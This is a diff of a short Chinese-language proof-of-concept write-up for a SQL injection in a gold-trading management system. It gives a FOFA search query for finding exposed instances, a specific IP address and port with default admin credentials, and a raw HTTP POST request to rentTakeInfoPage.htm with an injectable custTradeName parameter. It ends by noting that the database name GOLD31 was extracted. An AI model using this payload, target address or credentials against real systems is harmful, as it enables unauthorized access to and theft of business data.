@@ -1,9 +1,9 @@
 fofa:
-
+```plan
 title="黄金通二级系统三代管理端"
-
+```
 https://113.105.126.146:8900/  admin/123456
-
+```
 POST /storagework/rentTakeInfoPage.htm HTTP/1.1
 Host: 113.105.126.146:8900
 Cookie: JSESSIONID_null_8900=120szhvp9dh7nufxi51v08bs6
@@ -24,7 +24,7 @@ Te: trailers
 Connection: close
 
 page=1&origApp2=&RENTSTATEID=&custTradeName=*
+```
 
-https://github.com/eeeeeekkkkkkkk/POC/blob/main/images/%E5%9B%BE%E7%89%872.png
 ![图片.png](images/图片2.png)
 注出当前数据库为GOLD31
